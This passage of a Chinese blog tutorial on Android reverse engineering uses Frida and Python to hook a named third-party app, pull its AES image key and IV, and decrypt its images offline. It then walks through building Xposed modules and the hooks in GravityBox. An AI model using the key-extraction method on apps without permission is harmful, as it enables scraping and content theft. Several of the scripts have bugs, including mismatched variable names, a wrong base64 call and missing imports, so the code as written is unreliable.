path)</span></span><br><span class="line"><span class="comment">            var f = Java.use(&quot;java.io.File&quot;).$new(path)</span></span><br><span class="line"><span class="comment">            var fos = Java.use(&quot;java.io.FileOutputStream&quot;).$new(f)</span></span><br><span class="line"><span class="comment">            fos.write(data)</span></span><br><span class="line"><span class="comment">            fos.close()</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="title function_">send</span>(data)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(saveBitmap_1)</span><br></pre></td></tr></table></figure><p>&emsp;相应python脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># saveBitmap.py</span></span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        </span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 根据 uuid 生成文件名</span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># 写入字节流</span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 获得最上方的应用</span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;hookBitmap.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 错误处理</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><p>&emsp;运行saveBitmap.py后，再对图片进行刷新，就可以下载图片啦。但是！<code>我们目的不是为了下载图片，而是为了分析协议，也就是对如何对图片进行的解密</code>。</p><p>&emsp;我们使用objection hook decodeByteArray并打印调用栈：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.graphics.BitmapFactory.decodeByteArray &quot;[B, int, int, android.graphics.BitmapFactory$Options&quot; --dump-backtrace </span><br></pre></td></tr></table></figure><p>&emsp;发现业务层代码<code>com.ilulutv.fulao2.other.helper.glide.b.a</code>。使用jeb找到此函数，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231010201958270.png" alt="image-20231010201958270" style="zoom:67%;" /></p><p>&emsp;跟进解密函数，其中arg3为密钥Key，arg4为向量IV，arg5是要解密的数据。</p><p><img src="/images/frida-reverse-analysis-2/image-20231010202233421.png" alt="image-20231010202233421" style="zoom:67%;" /></p><p>&emsp;因此，可以使用主动调用的方式对key与IV进行获取，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getKey.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getKey</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CipherClient</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.idik.lib.cipher.so.CipherClient&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> key = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgKey</span>()</span><br><span class="line">        <span class="keyword">var</span> iv = <span class="title class_">CipherClient</span>.<span class="title function_">decodeImgIv</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(key, iv)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;获取到key与IV之后，采用rpc的方式来模拟，从而实现最终的脱机抓取图片数据。经过分析，前面抓包得到的图片数据其实是<code>com.ilulutv.fulao2.other.i.b.a</code>函数的返回值，因此可以写脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// final.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_image_ciphertext</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ilulutv.fulao2.other.i.b&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> a_func = b.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>)</span><br><span class="line">        a_func.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">a</span>(obj)</span><br><span class="line">            <span class="title function_">send</span>(result)</span><br><span class="line">            <span class="keyword">return</span> result            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># final.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IMGdecrypt</span>(<span class="params"><span class="built_in">bytearray</span></span>):</span><br><span class="line">    key = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line">    iv = <span class="string">&quot;xxxx&quot;</span>    </span><br><span class="line">    imgkey = base64.decodebytes(<span class="built_in">bytes</span>(key), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    imgiv = base64.decodebytes(<span class="built_in">bytes</span>(iv), encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(imgkey, AES.MODE_CBC, imgiv)</span><br><span class="line">    msg = cipher.decrypt(<span class="built_in">bytearray</span>)</span><br><span class="line">    <span class="keyword">return</span> msg                      </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        image = message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        intArr = []</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> image:</span><br><span class="line">            ival = <span class="built_in">int</span>(m)</span><br><span class="line">            <span class="keyword">if</span> ival &lt; <span class="number">0</span>:</span><br><span class="line">                ival += <span class="number">256</span></span><br><span class="line">            intArr.append(ival)</span><br><span class="line">        bs = <span class="built_in">bytes</span>(intArr)</span><br><span class="line">        bs = IMGdecrypt(bs)</span><br><span class="line">        <span class="comment"># 根据 uuid 生成文件名</span></span><br><span class="line">        fileName = <span class="built_in">str</span>(uuid.uuid1()) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;fileName:&quot;</span>, fileName)</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="comment"># 写入字节流</span></span><br><span class="line">        f.write(bs)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># 获得最上方的应用                                  </span></span><br><span class="line">target = device.get_frontmost_application()</span><br><span class="line">session = device.attach(target.pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line"><span class="comment"># 错误处理</span></span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="0x04-Xposed-Hook及主动调用与RPC实现"><a href="#0x04-Xposed-Hook及主动调用与RPC实现" class="headerlink" title="0x04 Xposed Hook及主动调用与RPC实现"></a>0x04 Xposed Hook及主动调用与RPC实现</h2><p>&emsp;Xposed 是 Frida 的前辈，其作为<code>系统框架类型的 hook 思想</code>对安卓安全研究有很大的影响。EdXposed 是 Xposed 的后续产品。本章主要介绍 Xposed 基本使用，并与 frida 做对比。</p><h3 id="Xposed-应用-hook"><a href="#Xposed-应用-hook" class="headerlink" title="Xposed 应用 hook"></a>Xposed 应用 hook</h3><h4 id="Xposed-安装-amp-Xposed插件（模块）"><a href="#Xposed-安装-amp-Xposed插件（模块）" class="headerlink" title="Xposed 安装&amp;Xposed插件（模块）"></a>Xposed 安装&amp;Xposed插件（模块）</h4><p>&emsp;需要在 Root 环境下通过 XposedInstaller App 安装对应系统的 xposed 框架，安装成功后，接着安装相应的 hook 框架并重启，从而完成对目标进程的 hook。xposed 本质上是替换安卓系统中的 zygote 与libart.so 库，来将 XposedBridge.jar 注入到应用中，从而实现进程的 hook。安装 xposed 需要满足：安卓版本小于等于7.1，系统 root。</p><p>&emsp;经过一番周折，终于将 Xposed 安装上了。</p><p>&emsp;Xposed插件以App的形式安装到系统中。举一个xposed插件（app）的例子，以说明xposed插件的开发流程。</p><p>（1）修改AndroidManifest.xml，在application节点下增加meta-data属性：</p><p><img src="/images/frida-reverse-analysis-2/image-20231019184544598.png" alt="image-20231019184544598" style="zoom:67%;" /></p><p>（2）在app目录下新建assets目录，并新建xposed_init文件，文件中填入Xposed模块入口类的完整类名，在此为：<code>com.roysue.xposed1.HookTest</code>。</p><p>（3）MainActivity.java中填入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AppCompatActivity 用于构建兼容的 Android 应用程序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">// 设置 activity_main.xml 为当前布局</span></span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 在当前布局中寻找 button</span></span><br><span class="line">        button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// 在屏幕底部提示消息</span></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, toastMessage(<span class="string">&quot;我未被劫持&quot;</span>), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toastMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;若没有hook代码，那么打开此插件后，会提示<code>我未被劫持</code>。下面，我们hook的目标为：<code>打印toastMessage函数的参数，并且修改返回值为&quot;你已被劫持&quot;</code>。那么该如何做咧？</p><p>（1）之前，在xposed_init中写入了<code>com.roysue.xposed1.HookTest</code>，从而指定了hook相关的类。我们要在此类中实现<code>IXposedHookLoadPackage</code>接口。之后，每个由Zygote孵化出的进程启动时都会调用接口中的<code>handleLoadPackage</code>函数。如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.xposed1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他的 import 在此先省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookTest</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 函数逻辑 logic-1 在此先省略</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其他函数在此先省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;如果想要hook指定进程，就需要对上述代码中的loadPackageParam进行过滤。loadPackageParam中包括一些成员变量，如下所示：</p><div class="table-container"><table><thead><tr><th>成员变量类型</th><th>成员变量名</th><th>含义</th></tr></thead><tbody><tr><td>String</td><td>packageName</td><td>包名</td></tr><tr><td>String</td><td>processName</td><td>进程名</td></tr><tr><td>ClassLoader</td><td>classLoader</td><td>进程的类加载器</td></tr><tr><td>ApplicationInfo</td><td>appInfo</td><td>其他信息</td></tr></tbody></table></div><p>&emsp;通常使用packageName进行过滤。</p><p>（2）锁定目标进程后，接下来对目标进程的函数进行hook，其中需要使用xposed相关的类：<code>XposedHelpers</code>。此类中提供了java类、类成员的接口函数。在此例中，需要使用此类中的<code>findAndHookMethod</code>函数。此函数参数为：要hook函数所在类的handle、函数名、函数参数列表、hook回调类<code>XC_MethodHook</code>。在将<code>XC_MethodHook</code>作为参数传给<code>findAndHookMethod</code>之前，需要实现抽象回调函数：<code>beforeHookedMethod</code>与<code>afterHookedMethod</code>。顾名思义，不必多说。</p><p>&emsp;因此，可以完善 logic-1，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 打印 hook 日志</span></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="comment">// log 日志</span></span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 packageName 进行过滤</span></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.roysue.xposed1&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;has hooked!&quot;</span>);</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;inner&quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;com.roysue.xposed1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="comment">// 使用 findAndHookMethod 来 hook 函数</span></span><br><span class="line">    XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;toastMessage&quot;</span>, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">oldText</span> <span class="operator">=</span> (String) param.args[<span class="number">0</span>];</span><br><span class="line">            Log.d(<span class="string">&quot;oldText&quot;</span>, oldText);</span><br><span class="line">            param.args[<span class="number">0</span>] = <span class="string">&quot;您已被劫持&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在Xposed Installer中激活此插件（模块），并重启系统。最终可以得到：</p><p><img src="/images/frida-reverse-analysis-2/image-20231019193235633.png" alt="image-20231019193235633" style="zoom:37%;" /></p><h4 id="Hook-API-详解"><a href="#Hook-API-详解" class="headerlink" title="Hook API 详解"></a>Hook API 详解</h4><p>&emsp;本节介绍了被大量使用的Xposed插件（模块），即GravityBox。通过此插件，对Xposed的hook相关API作进一步介绍。<code>GravityBox可以修改状态栏、锁屏、电源等</code>，源码在<a href="https://github.com/GravityBox/GravityBox">此</a>下载。</p><p>&emsp;GravityBox的分析路径如下：</p><p>（1）打开xposed_init，发现其中为：<code>com.ceco.r.gravitybox.GravityBox</code>。找到此类，此类实现了IXposedHookZygoteInit与IXposedHookLoadPackage的接口，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GravityBox</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookZygoteInit</span>, IXposedHookLoadPackage &#123;</span><br><span class="line">    <span class="comment">// 其中代码 logic-2 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;在此类中，有函数initZygote，用于在Zygote进程启动时执行（每次开机执行一次），正常使用中，initZygote用于初始化工具类。在GravityBox类中，重写initZygote函数，用于初始化配置文件（initZygote重写后调用XSharedPreferences）、打印关键信息，如下所示（logic-2）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其它函数</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initZygote</span><span class="params">(StartupParam startupParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">    MODULE_PATH = startupParam.modulePath;</span><br><span class="line">    <span class="keyword">if</span> (XposedBridge.getXposedVersion() &lt; <span class="number">93</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化配置文件</span></span><br><span class="line">        prefs = <span class="keyword">new</span> <span class="title class_">XSharedPreferences</span>(prefsFileProt);</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (startupParam.startsSystemServer) &#123;</span><br><span class="line">        <span class="comment">// 打印关键信息</span></span><br><span class="line">        XposedBridge.log(<span class="string">&quot;GB:Hardware: &quot;</span> + Build.HARDWARE);</span><br><span class="line">        <span class="comment">// 其它逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其它逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 其他函数</span></span><br></pre></td></tr></table></figure><p>&emsp;在logic-2中，还有一个重要的函数，即handleLoadPackage，此函数是进程启动时被调用的函数，作用为<code>完成java函数的hook工作</code>，其调用时机早于Application.onCreate函数。此函数中有很多if语句，以区分启动的app，从而在一个xposed模块（插件）中hook多个应用。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(LoadPackageParam lpparam)</span> &#123;</span><br><span class="line">    <span class="comment">// 其余逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(SystemPropertyProvider.PACKAGE_NAME)) &#123;</span><br><span class="line">        SystemPropertyProvider.init(prefs, qhPrefs, tunerPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModLowBatteryWarning.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModLowBatteryWarning.init(prefs, qhPrefs, lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 其余逻辑</span></span><br><span class="line">    <span class="keyword">if</span> (lpparam.packageName.equals(ModStatusbarColor.PACKAGE_NAME)) &#123;</span><br><span class="line">        ModStatusbarColor.init(lpparam.classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 其余逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;以<code>控制系统状态栏颜色</code>为例，跟踪ModStatusbarColor.init函数，发现其对函数的hook都是使用XposedHelpers类进行处理（使用类中的findAndHookMethod函数）。分析ModStatusbarColor.init函数代码，可以得到以下结论（分析过程略）：</p><ul><li><p>在afterHookedMethod或beforeHookedMethod函数中，使用<code>param.thisObject</code>即可拿到被hook函数的实例对象。</p></li><li><p>frida中获取实例对象的成员值，为<code>实例对象.成员名称.value</code>，而在xposed中为<code>XposedHelpers.get&lt;type&gt;Field(实例对象,成员名称)</code>，也有对应的<code>set&lt;type&gt;Field</code>方法。</p></li><li><p>frida中需要使用java.cast来完成类型的转换，而xposed本身就是java的，所以强制转换即可。</p></li></ul><p>&emsp;再来看GravityBox的ModAudio.java部分代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 其余逻辑</span></span><br><span class="line">XposedHelpers.findAndHookConstructor(<span class="string">&quot;android.media.AudioManager&quot;</span>, classLoader, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objService</span> <span class="operator">=</span> XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;getService&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">mApplicationContext</span> <span class="operator">=</span> (Context) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mApplicationContext&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (objService != <span class="literal">null</span> &amp;&amp; mApplicationContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            XposedHelpers.callMethod(param.thisObject, <span class="string">&quot;disableSafeMediaVolume&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 其余逻辑</span></span><br></pre></td></tr></table></figure><p>&emsp;可以看出，xposed还可以钩取类的构造函数，此时findAndHookConstructor无需传递函数名称。</p><p>&emsp;因此，可以说：<code>针对app中的类、函数、变量的处理都是通过XposedHelpers类中提供的函数实现的</code>。那么XposedHelpers是如何实现这些功能的呢？答案是用<code>java的反射</code>实现的。以XposedHelpers的getBooleanField为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">getBooleanField</span><span class="params">(Object obj, <span class="keyword">final</span> String 